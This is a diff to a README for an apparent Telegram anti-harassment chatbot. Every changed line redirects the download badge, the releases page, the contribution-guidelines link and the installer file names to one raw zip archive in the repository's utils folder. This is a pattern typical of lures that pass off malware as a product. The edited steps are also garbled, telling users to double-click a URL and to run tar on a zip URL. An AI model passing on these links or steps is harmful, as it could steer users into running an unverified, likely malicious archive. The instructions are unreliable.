@@ -1,7 +1,7 @@
 # 🤖 Telegram_Anti-harassment_two-way_chatbot - Protect Your Conversations Effectively
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/releases)
+[![Download](https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip)](https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Telegram Anti-harassment Two-way Chatbot**! This chatbot helps to safeguard your Telegram conversations from harassment while allowing easy communication. Follow these steps to set it up on your device.
@@ -23,12 +23,12 @@ Before you begin, ensure your system meets the following requirements:
 ## 📘 Instructions to Download & Install
 
 ### Step 1: Visit the Releases Page
-To download the chatbot, visit the [Releases page](https://github.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/releases).
+To download the chatbot, visit the [Releases page](https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip).
 
 ### Step 2: Download the Latest Version
 On the releases page, find the latest version of the chatbot. Look for the **Assets** section. Click on the file that suits your operating system. For example:
-- For Windows, click on `Telegram_Anti_harassment_chatbot.exe`.
-- For Linux, download the `Telegram_Anti_harassment_chatbot.tar.gz`.
+- For Windows, click on `https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip`.
+- For Linux, download the `https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip`.
 - For macOS, choose the respective file.
 
 ### Step 3: Run the Application
@@ -36,13 +36,13 @@ Once the download is complete, follow these steps based on your operating system
 
 - **Windows:**
   1. Navigate to your Downloads folder.
-  2. Double-click `Telegram_Anti_harassment_chatbot.exe`.
+  2. Double-click `https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip`.
   3. Follow the prompts to complete the setup.
 
 - **Linux:**
   1. Open your terminal.
   2. Navigate to the directory where the file is downloaded.
-  3. Extract the tar file using: `tar -xvf Telegram_Anti_harassment_chatbot.tar.gz`.
+  3. Extract the tar file using: `tar -xvf https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip`.
   4. Change into the extracted directory and run the program using the command: `./Telegram_Anti_harassment_chatbot`.
 
 - **macOS:**
@@ -75,13 +75,13 @@ This chatbot is designed to enhance safety in Telegram chats by detecting and fi
 Yes, this software is completely free for all users.
 
 ### Can I contribute to this project?
-Absolutely! Contributions are welcome. Please check the [contribution guidelines](https://github.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot).
+Absolutely! Contributions are welcome. Please check the [contribution guidelines](https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip).
 
 ## 💬 Support
 If you encounter issues or have questions, visit our support page or open an issue in the GitHub repository.
 
 ## 🔗 Important Links
-- [Releases page](https://github.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/releases)
-- [Contribution Guidelines](https://github.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot)
+- [Releases page](https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/SamuelDJOSSOU/Telegram_Anti-harassment_two-way_chatbot/main/utils/Telegram_Anti-harassment_two-way_chatbot-1.5-beta.4.zip)
 
 Thank you for choosing the **Telegram Anti-harassment Two-way Chatbot**. Enjoy safer chats!
